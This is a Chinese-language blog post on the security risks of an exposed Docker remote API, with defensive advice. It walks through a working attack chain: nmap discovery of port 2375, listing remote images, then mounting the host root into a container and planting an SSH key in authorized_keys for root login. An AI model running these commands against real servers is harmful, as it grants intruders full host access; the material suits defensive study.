@@ -1,0 +1,281 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+    
+	<title>Docker 远程API安全问题 - Hacker and Geeker&#39;s Way</title>
+    <meta name="author" content="">
+    
+	<meta name="description" content="Docker 远程API安全问题"> <!-- TODO: truncate -->
+	<meta name="keywords" content="docker, remote-api, secure">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="atom.xml" rel="alternate" title="Hacker and Geeker&#39;s Way" type="application/atom+xml">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href="/stylesheets/custom.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href="/stylesheets/hljs.css" media="screen, projection" rel="stylesheet" type="text/css">
+
+    <link href='/stylesheets/font.css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='/stylesheets/font.css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='/stylesheets/font.css?family=Amethysta+One' rel='stylesheet' type='text/css'>
+	  <script src="/javascripts/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![}]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!-- <script src="/javascripts/ajaxify.js"></script> -->
+
+    
+
+    
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-100485541-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+        Hacker and Geeker&#39;s Way
+    </div>
+</h1>
+<span class="subtitle"></span>
+<br>
+
+<ul id="social-links" style="text-align:center; clear:both;">
+  
+  <!-- GitHub -->
+  <li>
+  <a target="_blank" rel="noopener" href="https://github.com/zhaozhiming" class="github" title="Github"></a>
+  </li>
+  
+  
+  
+  
+  <!-- Twitter -->
+  <li>
+  <a target="_blank" rel="noopener" href="http://www.twitter.com/kingzzm" class="twitter" title="Twitter"></a>
+  </li>
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a target="_blank" rel="noopener" href="http://www.linkedin.com/in/zhaozhiming" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  
+  
+  
+  <!-- Stackoverflow -->
+  <li>
+  <a target="_blank" rel="noopener" href="http://stackoverflow.com/users/1954315/zhaozhiming" class="stackoverflow" title="Stackoverflow"></a>
+  </li>
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/archives/index.html">Archives</a></li>
+    <li><a href="/atom.xml">RSS</a></li>
+    <li><a href="/about/index.html">About</a></li>
+    
+    <li>
+    <div id="dark">
+        <form action="//www.google.com.hk/search" method="get" accept-charset="UTF-8" id="search">
+            <input type="hidden" name="sitesearch" value="https://zhaozhiming.github.io" />
+            <input type="text" name="q" results="0" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+
+</header>
+
+
+<div id="toload">
+<!-- begin toload -->
+    <div id="content">
+        <div class="inner">
+<article class="post">
+	<h2 class="title">Docker 远程API安全问题</h2>
+    <div class="meta">
+        <div class="date">Published on: <time datetime="2023-09-17T04:33:24.000Z" itemprop="datePublished">9月 17, 2023</time>
+</div>
+        <div class="tags">Tags: 
+
+<a href="/tags/docker/">docker</a> <a href="/tags/remote-api/">remote-api</a> <a href="/tags/secure/">secure</a>
+</div>
+    </div>
+	<div class="entry-content"><img src="/images/post/2023/09/docker-vul.jpg" class="" width="400" height="300">
+
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Docker_(software)">Docker</a> 为软件开发提供了很多便利，它允许软件在隔离的容器中运行，确保软件的一致性和可移植性。这意味着无论在哪个环境中，软件都能够以相同的方式运行，无需担心底层系统的差异，Docker 的镜像机制同时也让软件的部署和分发变得更加简单。尽管 Docker 提供了很多强大的功能，但如果这些功能没有使用好，那么它不仅无法发挥作用，还可能会带来严重的安全隐患，今天我们就来介绍下 Docker 下的远程 API 安全问题。</p>
+<span id="more"></span>
+
+<h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><p>首先我们来看下利用 Docker 远程 API 是如何进行攻击，下面的例子展示了通过 Docker 容器拿到主机的 shell 权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Docker API创建容器</span></span><br><span class="line">docker -H 192.168.1.10:2375 run -it -v /:/mnt 8e01a1d0a1dd /bin/sh</span><br><span class="line"><span class="comment"># 将本地的SSH公钥添加到容器中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;黑客SSH公钥&quot;</span> &gt;&gt; /mnt/.ssh/authorized_keys</span><br><span class="line"><span class="comment"># 本地使用私钥登陆主机</span></span><br><span class="line">ssh root@192.168.1.10</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 Docker 的<code>-H</code>命令连上远程服务器上的 Docker API，这里的<code>192.168.1.10</code>是我们假设的一个主机 IP 地址，<code>2375</code>是 Docker 远程 API 常用的端口号。</li>
+<li>利用 Docker 远程 API <code>docker run</code>新建一个容器，这里的<code>8e01a1d0a1dd</code>是一个远程服务器存在的镜像 ID，至于为什么可以知道这个镜像 ID，我们后面会介绍。</li>
+<li>新建容器时将远程服务器的根目录<code>/</code>挂载到容器的<code>/mnt</code>目录下，这样容器就可以访问到远程服务器的根目录。</li>
+<li>使用 Docker 的交互模式<code>-it</code>进入新建好的容器中。</li>
+<li>进入容器后可以先查看下挂载目录下的 ssh 目录：<code>ls /mnt/.ssh</code>，确认存在相关文件了再执行<code>echo</code>语句。</li>
+<li><code>echo</code>语句是将攻击者本地的公钥写到远程服务器的 SSH 授权文件中，这样攻击者就可以使用自己的私钥登陆远程服务器了。</li>
+</ul>
+<p>整个过程看起来很简单，但要成功执行这个攻击，需要开启 Docker 的远程 API。</p>
+<h2 id="开启-Docker-远程-API"><a href="#开启-Docker-远程-API" class="headerlink" title="开启 Docker 远程 API"></a>开启 Docker 远程 API</h2><p>Docker 远程 API 也有很多用处，比如可以通过远程 API 来管理 Docker 集群，或者通过远程 API 来管理远程服务器上的 Docker 容器，这样就不需要登录到远程服务器上来管理容器了。一些 Docker 的图形化管理工具或 Docker 监控管理工具就是通过远程 API 来管理 Docker 的。</p>
+<p>开启 Docker 的远程 API，可以通过修改 Docker 的配置文件（<code>/lib/systemd/system/docker.service</code>或者<code>/etc/systemd/system/docker.service.d/override.conf</code>）来进行开启：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /lib/systemd/system/docker.service 文件</span><br><span class="line">[Service]</span><br><span class="line"><span class="deletion">-ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span></span><br><span class="line"><span class="addition">+ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375 --containerd=/run/containerd/containerd.sock</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>ExecStart</code> 中添加<code>-H tcp://0.0.0.0:2375</code>即可，然后重新加载守护进程和重启 Docker 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新加载守护进程</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="comment"># 重启Docker</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker.service</span><br></pre></td></tr></table></figure>
+
+<p>我们可以验证一下 Docker 远程 API 是否开启成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> netstat -tulpn | grep 2375</span><br><span class="line">tcp6       0      0 :::2375                 :::*                    LISTEN      757/dockerd</span><br></pre></td></tr></table></figure>
+
+<p>可以看到是正常监听在<code>2375</code>端口上了。</p>
+<h2 id="发现-Docker-远程-API"><a href="#发现-Docker-远程-API" class="headerlink" title="发现 Docker 远程 API"></a>发现 Docker 远程 API</h2><p>假设有一台服务器上开启了 Docker 远程 API，我们要如何发现服务器上有这个服务呢？这里可以用<a target="_blank" rel="noopener" href="https://nmap.org/">Nmap</a>工具来进行扫描。Nmap 是一个开源的网络扫描和安全审计工具。它被设计用来发现设备在网络上运行和查找开放的网络端口。</p>
+<p>首先我们用 Nmap 扫描一下远程服务器上有哪些开放的端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sS -T5 192.168.1.10 -p-</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.10</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">2375/tcp open  docker</span><br><span class="line">MAC Address: AX:D:EF:F2:CA:46 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.77 seconds</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有 2 个开放端口：22 和 2375，其中 22 是 SSH 服务，2375 是 Docker 服务。到这里我们就可以基本确认了服务器上开启了 Docker 远程 API 服务，但我们还是可以进一步确认一下服务信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTV -p 2375 192.168.1.10</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.10</span><br><span class="line">Host is up (0.089s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">2375/tcp open  docker  Docker 24.0.6 (API 1.43)</span><br><span class="line">Service Info: OS: linux</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.35 seconds</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 2375 端口确实是 Docker 服务，并且还检查出了 Docker 的版本信息。现在我们可以用 Docker 命令来连接远程服务器上的 Docker 服务了，比如我们可以查询服务器上 Docker 更加详尽的版本信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ docker -H 192.168.1.10:2375 version</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          24.0.6</span><br><span class="line">  API version:      1.43 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.20.7</span><br><span class="line">  Git commit:       1a79695</span><br><span class="line">  Built:            Mon Sep  4 12:31:57 2023</span><br><span class="line">  OS/Arch:          linux/arm64</span><br><span class="line">  Experimental:     <span class="literal">false</span></span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.22</span><br><span class="line">  GitCommit:        8165feabfdfe38c65b599c4993d227328c231fca</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.8</span><br><span class="line">  GitCommit:        v1.1.8-0-g82f18fe</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br></pre></td></tr></table></figure>
+
+<p>还可以查看服务器上 Docker 的镜像信息（所以在最开始的示例中我们可以知道服务器上有哪些镜像 ID）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看远程服务器上的镜像</span></span><br><span class="line">$ docker -H 192.168.1.10:2375 images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    8e01a1d0a1dd4 months ago   9.14kB</span><br></pre></td></tr></table></figure>
+
+<h2 id="Docker-远程-API-的风险"><a href="#Docker-远程-API-的风险" class="headerlink" title="Docker 远程 API 的风险"></a>Docker 远程 API 的风险</h2><p>Docker 远程 API 是一个强大的工具，允许用户远程管理和控制 Docker 容器。但是，如果这个 API 被黑客恶意利用，后果可能是灾难性的。在轻微的情况下，黑客可以利用这个 API 在服务器上随意创建和运行容器。例如，他们可能会部署<strong>加密货币挖矿容器</strong>，这样你的服务器资源就会被滥用来为黑客挖矿，从而为他们赚取利润，而你可能完全不知情。此外，黑客还可以创建用于分布式拒绝服务（DDoS）攻击的容器，也被称为<strong>肉鸡</strong>。这意味着你的机器可能会被用作发起大规模网络攻击的工具，这不仅会损害你的机器的性能，还可能导致你面临法律责任。</p>
+<p>更为严重的是，如之前的示例所示，黑客可以通过 Docker 远程 API 获得对主机的完全 shell 访问权限。这不仅仅是对单台服务器的威胁。如果这台服务器是连接到企业内部网络的<strong>关键节点</strong>，那么黑客就有可能利用这个入口点进入整个企业网络。一旦他们获得了这样的访问权限，他们可以窃取敏感数据、破坏关键系统或进行其他恶意活动。这种入侵可能导致企业面临巨大的经济损失、品牌声誉受损，甚至可能违反数据保护法规，导致法律诉讼。</p>
+<p>我们在访问 Docker 远程 API 时 Docker 也会提示相关的风险，具体信息可以看<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/security/#docker-daemon-attack-surface">Docker 官方文档</a>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING: API is accessible on http://0.0.0.0:2375 without encryption.</span><br><span class="line">         Access to the remote API is equivalent to root access on the host. Refer</span><br><span class="line">         to the <span class="string">&#x27;Docker daemon attack surface&#x27;</span> section <span class="keyword">in</span> the documentation <span class="keyword">for</span></span><br><span class="line">         more information: https://docs.docker.com/go/attack-surface/</span><br></pre></td></tr></table></figure>
+
+<h2 id="现实世界"><a href="#现实世界" class="headerlink" title="现实世界"></a>现实世界</h2><p>可能有人会问，如果 Docker 远程 API 有这么大的安全风险，那应该没有人会开启这个服务吧？其实不然，我们可以用网络空间搜索引擎<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">ZoomEye</a>来搜索一下目前全球开启了 Docker 远程 API 的服务器有多少：</p>
+<img src="/images/post/2023/09/zoomeye.png" class="" width="1000" height="600">
+
+<p>可以看到全球有 700 多台服务器上开启了 Docker 远程 API，有些人可能不了解 Docker 远程 API 的安全问题，有些人可能是因为一些环境而默认开启的，这样服务器就会面临被攻击的风险。</p>
+<h2 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h2><p>最好的防范措施就是不要开启 Docker 远程 API，如果确实需要开启，那么就要对 Docker 远程 API 进行安全配置，下面列举了一些开启 Docker 远程 API 的安全措施：</p>
+<ul>
+<li>限制特定 IP 访问：如果你想允许特定的 IP 地址访问 Docker 远程 API，可以使用防火墙规则（如 iptables）来限制只允许受信任的 IP 地址访问端口。</li>
+<li>基于证书的身份验证：Docker 支持使用 TLS 证书进行身份验证，启动 Docker 远程 API 时指定证书路径，客户端也需要使用相应的证书来连接到 Docker 远程 API。</li>
+<li>用户名密码认证：Docker 远程 API 本身不支持基于用户名和密码的身份验证。但你可以使用反向代理（如 Nginx 或 Apache）来为 Docker API 提供这种身份验证。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这篇文章中，我们介绍了 Docker 远程 API 的安全问题，以及如何发现和利用 Docker 远程 API 进行攻击。Docker 远程 API 是一个强大的工具，但如果没有安全配置，那么它就会成为一个安全隐患。因此，我们应该尽可能地避免开启 Docker 远程 API，如果确实需要开启，那么就要对 Docker 远程 API 进行安全配置。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124">Attacking Docker exposed API</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html">Why is Exposing the Docker Socket a Really Bad Idea?</a></li>
+</ul>
+</div>
+
+</article>
+<section id="appreciates">
+  <center>
+	<h2>赞赏</h2>
+    <div class="post-footer">
+      <div>
+	    <h4>如果文章对您有所帮助，可以捐赠我喝杯咖啡😌，捐赠方式：</h4>
+        <div class="digital-wallet">
+          <h6>BTC 地址：3LYgSyf7ddMALwGWPQr3PY4wzjsTDdg1oV</h6>
+          <h6>ETH 地址：0x0C9b27c89A61aadb0aEC24CA8949910Cbf77Aa73</h6>
+        </div>
+        <div class="wechat_appreciates">
+          <img src="/images/wechat_appreciates.png" alt="qrcode" width="250" >
+        </div>
+      </div>
+      <div>
+	    <h4>文章已同步更新公众号，欢迎关注</h4>
+        <div class="wechat_appreciates">
+          <img src="/images/wxgzh_qrcode.jpg" alt="qrcode" width="250" >
+        </div>
+      </div>
+    </div>
+  </center>
+</section>
+
+
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+            this.page.url = 'https://zhaozhiming.github.io/2023/09/17/docker-remote-api-secure-vulner/';
+            this.page.identifier = 'https://zhaozhiming.github.io/2023/09/17/docker-remote-api-secure-vulner/';
+        };
+
+        (function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//zhaozhiming.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+
+    </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2024
+
+    赵芝明
+. Powered by <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> |
+    Theme is <a target="_blank" rel="noopener" href="https://github.com/wd/hexo-fabric">hexo-fabric</a>, fork from <a target="_blank" rel="noopener" href="http://github.com/panks/fabric">fabric</a> by <a target="_blank" rel="noopener" href="http://panks.me">Pankaj Kumar</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script>
+ <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5608723650603289" crossorigin="anonymous"></script>
+</body>
+</html>
